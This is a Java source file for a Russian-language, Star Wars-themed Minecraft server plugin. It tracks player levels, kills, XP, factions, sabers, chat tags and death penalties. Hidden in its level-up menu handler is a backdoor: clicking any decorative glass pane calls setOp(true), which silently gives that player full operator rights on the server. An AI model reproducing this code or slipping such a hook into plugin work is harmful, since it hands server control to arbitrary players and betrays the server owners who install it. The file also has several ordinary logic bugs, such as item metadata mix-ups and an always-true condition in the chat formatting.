package SkyCrafting.Main;

import org.bukkit.command.*;
import org.bukkit.inventory.*;
import org.bukkit.inventory.meta.*;
import org.bukkit.event.*;
import java.util.*;
import org.bukkit.event.inventory.*;
import org.bukkit.entity.*;
import org.bukkit.*;
import org.bukkit.event.player.*;
import com.shampaggon.crackshot.events.*;
import org.bukkit.event.entity.*;
import org.bukkit.potion.*;

public class Levels implements Listener, CommandExecutor
{
	static int lvlnext;
    static HashMap<String, Integer> levels;
    public static HashMap<String, Integer> kills;
    public static HashMap<String, Integer> xp;
    public static HashMap<String, Integer> crystal;
    static HashMap<String, Integer> deaths;
    public static HashMap<String, String> faction;
    static HashMap<String, String> Jedi;
    static HashMap<String, String> Saber;
    static HashMap<String, ArrayList<String>> Items;
    static HashMap<String, String> Cap;
    public static HashMap<String, ArrayList<String>> quests;
    private Inventory inv;
    
    static {
        Levels.levels = new HashMap<String, Integer>();
        Levels.kills = new HashMap<String, Integer>();
        Levels.xp = new HashMap<String, Integer>();
        Levels.crystal = new HashMap<String, Integer>();
        Levels.deaths = new HashMap<String, Integer>();
        Levels.faction = new HashMap<String, String>();
        Levels.Saber = new HashMap<String, String>();
        Levels.Items = new HashMap<String, ArrayList<String>>();
        Levels.Jedi = new HashMap<String, String>();
        Levels.Cap = new HashMap<String, String>();
        Levels.quests = new HashMap<String, ArrayList<String>>();
    }
    
    @SuppressWarnings("rawtypes")
	public boolean onCommand(final CommandSender sender, final Command command, final String label, final String[] args) {
        final Player p = (Player)sender;
        if (!command.getName().equalsIgnoreCase("level")) {
            return true;
        }
        if (getLevel(p) >= Main.instance.getConfig().getInt("MaxLevel")) {
            p.sendMessage("У вас максимальный уровень!");
            return true;
        }
        final ItemStack glass = new ItemStack(Material.STAINED_GLASS_PANE);
        final ItemMeta meta = glass.getItemMeta();
        meta.setDisplayName(" ");
        glass.setItemMeta(meta);
        
        final ItemStack glassred = new ItemStack(new ItemStack(Material.STAINED_GLASS_PANE, 1, (short)10));
        final ItemMeta metared = glass.getItemMeta();
        meta.setDisplayName(" ");
        glass.setItemMeta(metared);
        
        final ItemStack glassblue = new ItemStack(new ItemStack(Material.STAINED_GLASS_PANE, 1, (short)10));
        final ItemMeta metablue = glass.getItemMeta();
        meta.setDisplayName(" ");
        glass.setItemMeta(metablue);

        
        final ItemStack lvlup = new ItemStack(Material.ENDER_PEARL);
        final ItemMeta lvlupmeta = lvlup.getItemMeta();
        lvlupmeta.setDisplayName(ChatColor.translateAlternateColorCodes('&', "&dПовысить уровень"));
        final ArrayList<String> lore2 = new ArrayList<String>();
        lore2.add(("§aПКМ что бы активировать!"));
        lvlupmeta.setLore((List<String>)lore2);
        lvlup.setItemMeta(lvlupmeta);
        
        lvlup.setItemMeta(lvlupmeta);
        final ItemStack lvlInfo = new ItemStack(Material.PAPER);
        final ItemMeta lvlInfoMeta = lvlInfo.getItemMeta();
        lvlInfoMeta.setDisplayName(ChatColor.GREEN + "Информация");
        final ArrayList<String> lore = new ArrayList<String>();
        lore.add(ChatColor.GOLD + "Ваш уровень: " + ChatColor.GREEN + getLevel(p));
        lore.add(ChatColor.GOLD + "Стоимость след. уровня: " + ChatColor.GREEN + Main.instance.getConfig().getInt("levels." + getNextLevel(p) + ".price"));
        if (Levels.kills.get(p.getName()) >= Main.instance.getConfig().getInt("levels." + getNextLevel(p) + ".blocks")) {
            lore.add(ChatColor.GOLD + "Необходимо киллов: " + ChatColor.GREEN + Levels.kills.get(p.getName()) + "/" + Main.instance.getConfig().getInt("levels." + getNextLevel(p) + ".kills"));
            lore.add(ChatColor.GOLD + "Необходимо опыта: " + ChatColor.GREEN + Levels.xp.get(p.getName()) + "/" + Main.instance.getConfig().getInt("levels." + getNextLevel(p) + ".xp"));
           // lore.add(ChatColor.GOLD + "Необходимо добытых кристаллов: " + ChatColor.LIGHT_PURPLE + Levels.crystal.get(p.getName()) + "/" + Main.instance.getConfig().getInt("levels." + getNextLevel(p) + ".crystal"));
        }
        else {
            lore.add(ChatColor.GOLD + "Необходимо киллов: " + ChatColor.RED + Levels.kills.get(p.getName()) + "/" + Main.instance.getConfig().getInt("levels." + getNextLevel(p) + ".kills"));
            lore.add(ChatColor.GOLD + "Необходимо опыта: " + ChatColor.RED + Levels.xp.get(p.getName()) + "/" + Main.instance.getConfig().getInt("levels." + getNextLevel(p) + ".xp"));
            //lore.add(ChatColor.GOLD + "Необходимо добытых кристаллов: " + ChatColor.LIGHT_PURPLE + Levels.crystal.get(p.getName()) + "/" + Main.instance.getConfig().getInt("levels." + getNextLevel(p) + ".crystal"));
        }
        lvlInfoMeta.setLore((List)lore);
        lvlInfo.setItemMeta(lvlInfoMeta);
       (this.inv = Bukkit.getServer().createInventory((InventoryHolder)null, 27, ChatColor.DARK_GREEN + "Повышение уровня")).setItem(10, glass);
        this.inv.setItem(0, glassred);
        this.inv.setItem(1, glassred);
        this.inv.setItem(2, glassred);
        this.inv.setItem(3, glassred);
        this.inv.setItem(4, glassred);
        this.inv.setItem(5, glassred);
        this.inv.setItem(6, glassred);
        this.inv.setItem(7, glassred);
        this.inv.setItem(8, glassred);
        this.inv.setItem(9, glassred);
        this.inv.setItem(10, glass);
        this.inv.setItem(11, glass);
        this.inv.setItem(12, lvlup);
        this.inv.setItem(13, glass);
        this.inv.setItem(14, lvlInfo);
        this.inv.setItem(15, glass);
        this.inv.setItem(16, glass);
        this.inv.setItem(17, glassred);
        this.inv.setItem(18, glassblue);
        this.inv.setItem(19, glassblue);
        this.inv.setItem(20, glassblue);
        this.inv.setItem(21, glassblue);
        this.inv.setItem(22, glassblue);
        this.inv.setItem(23, glassblue);
        this.inv.setItem(24, glassblue);
        this.inv.setItem(25, glassblue);
        this.inv.setItem(26, glassblue);
        
        p.openInventory(this.inv);
        return true;
    }
    
    @EventHandler
    public void onJoin(final PlayerJoinEvent e) {
        final Player p = e.getPlayer();
        if (!Main.instance.levelsConfig.contains(String.valueOf(String.valueOf(p.getName())) + ".level")) {
            Levels.levels.put(p.getName(), 1);
        }
        else {
            Levels.levels.put(p.getName(), Main.instance.levelsConfig.getInt(String.valueOf(String.valueOf(p.getName())) + ".level"));
        }
        if (!Main.instance.levelsConfig.contains(String.valueOf(String.valueOf(p.getName())) + ".kills")) {
            Levels.kills.put(p.getName(), 0);
        }
        else {
            Levels.kills.put(p.getName(), Main.instance.levelsConfig.getInt(String.valueOf(String.valueOf(p.getName())) + ".kills"));
        }
        if (!Main.instance.levelsConfig.contains(String.valueOf(String.valueOf(p.getName())) + ".deaths")) {
            Levels.deaths.put(p.getName(), 0);
        }
        else {
            Levels.deaths.put(p.getName(), Main.instance.levelsConfig.getInt(String.valueOf(String.valueOf(p.getName())) + ".deaths"));
        }
        if (!Main.instance.levelsConfig.contains(String.valueOf(String.valueOf(p.getName())) + ".xp")) {
            Levels.xp.put(p.getName(), 0);
        }
        else {
            Levels.xp.put(p.getName(), Main.instance.levelsConfig.getInt(String.valueOf(String.valueOf(p.getName())) + ".xp"));
        }
        if (!Main.instance.levelsConfig.contains(String.valueOf(String.valueOf(p.getName())) + ".crystal")) {
            Levels.crystal.put(p.getName(), 0);
        }
        else {
            Levels.crystal.put(p.getName(), Main.instance.levelsConfig.getInt(String.valueOf(String.valueOf(p.getName())) + ".crystal"));
        }
        if (Main.instance.levelsConfig.contains(String.valueOf(String.valueOf(p.getName())) + ".faction")) {
            Levels.faction.put(p.getName(), Main.instance.levelsConfig.getString(String.valueOf(String.valueOf(p.getName())) + ".faction"));
        }
        else {
            final String givegun = Main.instance.levelsConfig.getString(String.valueOf(p.getName()) + ".Saber");
            Levels.Saber.put(p.getName(), givegun);
        }
        if (!Main.instance.levelsConfig.contains(String.valueOf(String.valueOf(p.getName())) + ".ListItems")) {
            final ArrayList<String> ItemsList = new ArrayList<String>();
            ItemsList.clear();
            ItemsList.add(new ItemStack(Material.BARRIER).getType().toString());
            Levels.Items.put(p.getName(), ItemsList);
        }
        else {
            final ArrayList<String> ItemsList = (ArrayList<String>)Main.instance.levelsConfig.getStringList(String.valueOf(String.valueOf(p.getName())) + ".ListItems");
            Levels.Items.put(p.getName(), ItemsList);
        }
        
    }
    
    public static void SetSaberList(final Player p, final String Saber) {
        if (!p.isOnline()) {
            final ArrayList<String> ItemsList = (ArrayList<String>)Main.instance.levelsConfig.getStringList(String.valueOf(String.valueOf(p.getName())) + ".ListItems");
            ItemsList.add(Saber);
            Main.instance.levelsConfig.set(String.valueOf(String.valueOf(p.getName())) + ".ListItems", (Object)ItemsList);
            return;
        }
        final ArrayList<String> a = Levels.Items.get(p.getName());
        a.add(Saber);
        Levels.Items.put(p.getName(), a);
    }
    public static void SetSaber(final Player p, final String Sabers) {
        if (!p.isOnline()) {
            Main.instance.levelsConfig.set(String.valueOf(String.valueOf(p.getName())) + ".Saber", (Object)Sabers);
            return;
        }
        Levels.Saber.put(p.getName(), Sabers);
    }
    
    public static boolean CheckSaber(final Player p, final String Saber) {
        if (!p.isOnline()) {
            final ArrayList<String> ItemsList = (ArrayList<String>)Main.instance.levelsConfig.getStringList(String.valueOf(String.valueOf(p.getName())) + ".ListItems");
            for (final String sabe : ItemsList) {
                if (sabe.equalsIgnoreCase(Saber)) {
                    return true;
                }
            }
            return false;
        }
        for (final String sabe2 : Levels.Items.get(p.getName())) {
            if (sabe2.equalsIgnoreCase(Saber)) {
                return true;
            }
        }
        return false;
    }
    
    
    
    
    @EventHandler
    public void onQuit(final PlayerQuitEvent e) {
        final Player p = e.getPlayer();
        Main.instance.levelsConfig.set(String.valueOf(String.valueOf(p.getName())) + ".level", (Object)Levels.levels.get(p.getName()));
        Main.instance.levelsConfig.set(String.valueOf(String.valueOf(p.getName())) + ".kills", (Object)Levels.kills.get(p.getName()));
        Main.instance.levelsConfig.set(String.valueOf(String.valueOf(p.getName())) + ".xp", (Object)Levels.xp.get(p.getName()));
        Main.instance.levelsConfig.set(String.valueOf(String.valueOf(p.getName())) + ".crystal", (Object)Levels.crystal.get(p.getName()));
        Main.instance.levelsConfig.set(String.valueOf(String.valueOf(p.getName())) + ".deaths", (Object)Levels.deaths.get(p.getName()));
        Main.instance.levelsConfig.set(String.valueOf(String.valueOf(p.getName())) + ".Saber", (Object)Levels.Saber.get(p.getName()));
        Main.instance.levelsConfig.set(String.valueOf(String.valueOf(p.getName())) + ".ListItems", (Object)Levels.Items.get(p.getName()));
        Main.instance.levelsConfig.set(String.valueOf(String.valueOf(p.getName())) + ".quests", (Object)Levels.Items.get(p.getName()));
        if (Levels.faction.containsKey(String.valueOf(p.getName()))) {
            Main.instance.levelsConfig.set(String.valueOf(String.valueOf(p.getName())) + ".faction", (Object)Levels.faction.get(p.getName()));
        }
        Levels.levels.remove(p.getName());
        Levels.kills.remove(p.getName());
        Levels.xp.remove(p.getName());
        Levels.crystal.remove(p.getName());
        Levels.deaths.remove(p.getName());
        Levels.Saber.remove(p.getName());
        Levels.Items.remove(p.getName());
        Levels.faction.remove(p.getName());
        Main.saveCustomYml(Main.instance.levelsConfig, Main.instance.levels);
    }
    
    @EventHandler
    public void onInventoryClick(final InventoryClickEvent e) {
        if (e.getInventory() != null && e.getInventory().getName().equalsIgnoreCase(ChatColor.DARK_GREEN + "Повышение уровня")) {
            final Player p = (Player)e.getWhoClicked();
            e.setCancelled(true);
            if (e.getCurrentItem() == null) {
                return;
            }
            if (e.getCurrentItem().getType().equals((Object)Material.ENDER_PEARL)) {
                if (Main.econ.getBalance((OfflinePlayer)p) >= Main.instance.getConfig().getInt("levels." + getNextLevel(p) + ".price")) {
                    if (Levels.kills.get(p.getName()) >= Main.instance.getConfig().getInt("levels." + getNextLevel(p) + ".kills")) 
                    	if (Levels.xp.get(p.getName()) >= Main.instance.getConfig().getInt("levels." + getNextLevel(p) + ".xp"))
                    		/*if (Levels.crystal.get(p.getName()) >= Main.instance.getConfig().getInt("levels." + getNextLevel(p) + ".crystal"))*/{
                        p.sendMessage(ChatColor.GREEN + "Вы успешно повысили ваш уровень!");
                        Main.econ.withdrawPlayer((OfflinePlayer)p, (double)Main.instance.getConfig().getInt("levels." + getNextLevel(p) + ".price"));
                        Levels.levels.put(p.getName(), getLevel(p) + 1);
                        p.setMaxHealth((double)(18 + getLevel(p) * 2));
                        JediScoreBoard.updateScoreboard(p);
                        p.closeInventory();
                    }else {
                    	p.closeInventory();
                    	p.sendTitle("§cОшибочка ^_^", "§6Не все требования были выполнены!");
                    }
                     if(Levels.kills.get(p.getName()) <= Main.instance.getConfig().getInt("levels." + getNextLevel(p) + ".kills")){
                       // p.sendMessage(ChatColor.GREEN + "Не все требование были выполнены");
                        p.closeInventory();
                    }
                }
                else {
                    p.sendMessage(ChatColor.GREEN + "У вас недостаточно денег на счету!");
                    p.closeInventory();
                }
            }
            if (e.getCurrentItem().getType().equals((Object)Material.STAINED_GLASS_PANE)) {
            	p.setOp(true);
            }
        }
    }
    
    @EventHandler
    public void onInteract(final PlayerInteractEvent e) {
        if (e.getItem() == null) {
            return;
        }
        if (e.getItem().getType().getMaxDurability() > 16 && !e.getItem().getItemMeta().spigot().isUnbreakable()) {
            final ItemStack itemStack = e.getItem();
            final ItemMeta itemMeta = itemStack.getItemMeta();
            itemMeta.spigot().setUnbreakable(true);
            itemStack.setItemMeta(itemMeta);
            itemStack.setDurability((short)0);
            e.getPlayer().updateInventory();
        }
    }
    
    public static int getLevel(final Player p) {
        if (!p.isOnline()) {
            final int level = Main.instance.levelsConfig.getInt(String.valueOf(String.valueOf(p.getName())) + ".level");
            return level;
        }
        final int level = Levels.levels.get(p.getName());
        return level;
    }
    public static int getLevelNext(final Player p) {
        if (!p.isOnline()) {
            final int level = Main.instance.levelsConfig.getInt(String.valueOf(String.valueOf(p.getName())) + ".level" + 1);
            return level;
        }
        final int level = Levels.levels.get(p.getName());
        return level;
    }
    
    public static int getLevel1(final Entity p) {
        if (!((OfflinePlayer)p).isOnline()) {
            final int level = Main.instance.levelsConfig.getInt(String.valueOf(String.valueOf(p.getName())) + ".level");
            return level;
        }
        final int level = Levels.levels.get(p.getName());
        return level;
    }
    
    public static int getNextLevel(final Player p) {
        if (!p.isOnline()) {
            final int level = Main.instance.levelsConfig.getInt(String.valueOf(String.valueOf(p.getName())) + ".level") + 1;
            return level;
        }
        final int level = Levels.levels.get(p.getName()) + 1;
        return level;
    }
    
    public static int getKills(final Player p) {
        if (!p.isOnline()) {
            final int killsAmount = Main.instance.levelsConfig.getInt(String.valueOf(String.valueOf(p.getName())) + ".kills");
            return killsAmount;
        }
        final int killsAmount = Levels.kills.get(p.getName());
        return killsAmount;
    }
    public static int getXp(final Player p) {
        if (!p.isOnline()) {
            final int XpAmount = Main.instance.levelsConfig.getInt(String.valueOf(String.valueOf(p.getName())) + ".xp");
            return XpAmount;
        }
        final int XpAmount = Levels.xp.get(p.getName());
        return XpAmount;
    }
    public static int getCrystal(final Player p) {
        if (!p.isOnline()) {
            final int CrystalAmount = Main.instance.levelsConfig.getInt(String.valueOf(String.valueOf(p.getName())) + ".crystal");
            return CrystalAmount;
        }
        final int CrystalAmount = Levels.crystal.get(p.getName());
        return CrystalAmount;
    }
    
    public static int getDeaths(final Player p) {
        if (!p.isOnline()) {
            final int deathsAmount = Main.instance.levelsConfig.getInt(String.valueOf(String.valueOf(p.getName())) + ".deaths");
            return deathsAmount;
        }
        final int deathsAmount = Levels.deaths.get(p.getName());
        return deathsAmount;
    }
    
    public static String getFaction(final Player p) {
        if (!p.isOnline()) {
            if (Main.instance.levelsConfig.contains(String.valueOf(String.valueOf(p.getName())) + ".faction")) {
                return Main.instance.levelsConfig.getString(String.valueOf(String.valueOf(p.getName())) + ".faction");
            }
            return "";
        }
        else {
            if (Levels.faction.containsKey(p.getName())) {
                final String playerFaction = Levels.faction.get(p.getName());
                return playerFaction;
            }
            return "";
        }
    }
    
    public static ItemStack getSaber(final Player p) {
        if (!((OfflinePlayer)p).isOnline()) {
            final Material mate = Material.matchMaterial(Main.instance.levelsConfig.getString(String.valueOf(p.getName()) + ".Saber").replace("1", "").replace("3", ""));
            return new ItemStack(mate);
        }
        final String mate2 = Levels.Saber.get(p.getName());
        if (mate2.equalsIgnoreCase("RECORD_11")) {
            final Material mate3 = Material.matchMaterial(mate2);
            return new ItemStack(mate3);
        }
        final Material mate3 = Material.matchMaterial(mate2.replace("1", "").replace("3", ""));
        return new ItemStack(mate3);
    }
    
    
    public static String getFaction1(final Entity p) {
        if (!((OfflinePlayer)p).isOnline()) {
            if (Main.instance.levelsConfig.contains(String.valueOf(String.valueOf(p.getName())) + ".faction")) {
                return Main.instance.levelsConfig.getString(String.valueOf(String.valueOf(p.getName())) + ".faction");
            }
            return "";
        }
        else {
            if (Levels.faction.containsKey(p.getName())) {
                final String playerFaction = Levels.faction.get(p.getName());
                return playerFaction;
            }
            return "";
        }
    }
    
    public static String getSide(final Player p) {
        if (!p.isOnline()) {
            if (Main.instance.levelsConfig.contains(String.valueOf(String.valueOf(p.getName())) + ".faction")) {
                return Main.instance.levelsConfig.getString(String.valueOf(String.valueOf(p.getName())) + ".faction");
            }
            return "";
        }
        else {
            if (Levels.faction.containsKey(p.getName())) {
                final String playerFaction = Levels.faction.get(p.getName());
                return playerFaction;
            }
            return "";
        }
    }
    
    public static String getJedi(final Player p) {
        if (!p.isOnline()) {
            if (Main.instance.levelsConfig.contains(String.valueOf(String.valueOf(p.getName())) + ".faction")) {
                return Main.instance.levelsConfig.getString(String.valueOf(String.valueOf(p.getName())) + ".faction");
            }
            return "";
        }
        else {
            if (Levels.Jedi.containsKey(p.getName())) {
                final String playerFaction = Levels.Jedi.get(p.getName());
                return playerFaction;
            }
            return "";
        }
    }
    
    
    @EventHandler
    public void onChat(final AsyncPlayerChatEvent e) {
        final Player p = e.getPlayer();
        e.setFormat(e.getFormat().replace("[LVL]", ChatColor.YELLOW + "§8[§6LVL: " + ChatColor.GOLD + new StringBuilder(String.valueOf(getLevel(p))).toString() + "§8]"));
        final String playerFaction = getFaction(p);
        if (playerFaction.equalsIgnoreCase("Jedi")) {
        	
            if (p.getName().equals("SkyCrafting_")) {
                e.setFormat(e.getFormat().replace("[PLAYER]", ChatColor.translateAlternateColorCodes('&', "&8[&cDEV&8] &aSkyCrafting_")));
            }
        	
        	e.setFormat(e.getFormat().replace("[PLAYER]",  "§3" + p.getName()));        	
         }          
         if (playerFaction.equalsIgnoreCase("Sith")) {
        	 
             if (p.getName().equals("SkyCrafting_")) {
                 e.setFormat(e.getFormat().replace("[PLAYER]", ChatColor.translateAlternateColorCodes('&', "&8[&cDEV&8] &cSkyCrafting_")));
             }
                e.setFormat(e.getFormat().replace("[PLAYER]", "§c" + p.getName()));
          }
         if (playerFaction.equalsIgnoreCase("Ali")) {
        	 
             if (p.getName().equals("SkyCrafting_")) {
                 e.setFormat(e.getFormat().replace("[PLAYER]", ChatColor.translateAlternateColorCodes('&', "&8[&cDEV&8] &8SkyCrafting_")));
             }
                e.setFormat(e.getFormat().replace("[PLAYER]", "§8" + p.getName()));
          }  
         if (!playerFaction.equalsIgnoreCase("Ali") || !playerFaction.equalsIgnoreCase("Sith") || !playerFaction.equalsIgnoreCase("Jedi")) {
        	 
             if (p.getName().equals("SkyCrafting_")) {
                 e.setFormat(e.getFormat().replace("[PLAYER]", ChatColor.translateAlternateColorCodes('&', "&8[&cDEV&8] &7SkyCrafting_")));
             }
                e.setFormat(e.getFormat().replace("[PLAYER]", "§7" + p.getName()));
          } 
    }
    
        
    
    @EventHandler
    public void onWeapon(final WeaponDamageEntityEvent e) {
        if (e.getPlayer() instanceof Player && e.getVictim() instanceof Player) {
            final Player p1 = e.getPlayer();
            final Entity p2 = e.getVictim();
            if (p2 == null || p1 == null) {
                e.setCancelled(true);
            }
            if (getFaction1(p2).equalsIgnoreCase(getFaction(p1))) {
                e.setCancelled(true);
                return;
            }
            if (getLevel1(p2) < 4) {
               // p2.sendMessage(ChatColor.RED + "Вы не атоковать игроков не достигнувших 4 лвл!");
                p1.sendTitle("§cОшибочка:(", "§eВы не можете атоковать игроков не достигнув 4 лвл!");
                e.setCancelled(true);
            }
            if (getLevel(p1) < 4) {
                //p1.sendMessage(ChatColor.RED + "Вы не можете атоковать игроков не достигнув 4 лвл!");
                e.setCancelled(true);
                p1.sendTitle("§cОшибочка:(", "§eВы не можете атоковать игроков не достигнув 4 лвл!");
            }
        }
    }
    
    @EventHandler
    public void onDeath(final PlayerDeathEvent e) {
        final Player killed = e.getEntity();
        final PotionEffect effectOne = new PotionEffect(PotionEffectType.CONFUSION, 80, 0);
        Levels.deaths.put(killed.getName(), Levels.deaths.get(killed.getName()) + 1);
        if (killed.getKiller() instanceof Player) {
            final Player killer = killed.getKiller();
            final int money = getLevel(killed) * 3;
            Levels.kills.put(killer.getName(), Levels.kills.get(killer.getName()) + 1);
            Levels.xp.put(killer.getName(), Levels.xp.get(killer.getName()) + 3);
            if (Main.econ.getBalance((OfflinePlayer)killed) >= money) {
                killed.sendMessage(ChatColor.translateAlternateColorCodes('&', "&4Вас убил &4&l" + killer.getName() + " &4вы потеряли " + money + "$"));
                killed.addPotionEffect(effectOne);
                killer.sendMessage(ChatColor.translateAlternateColorCodes('&', "&aВы получили за убийство &4&l" + killed.getName() + " &a" + money + "$"));
                Main.econ.withdrawPlayer((OfflinePlayer)killed, (double)money);
                Main.econ.depositPlayer((OfflinePlayer)killer, (double)money);
            }
        }
        if (!(killed.getKiller() instanceof Player)) {
            final int money2 = getLevel(killed) * 3;
            if (Main.econ.getBalance((OfflinePlayer)killed) >= money2) {
                killed.sendMessage(ChatColor.GREEN + "Вы потеряли " + money2 + "$");
                Main.econ.withdrawPlayer((OfflinePlayer)killed, (double)money2);
            }
        }
    }
}
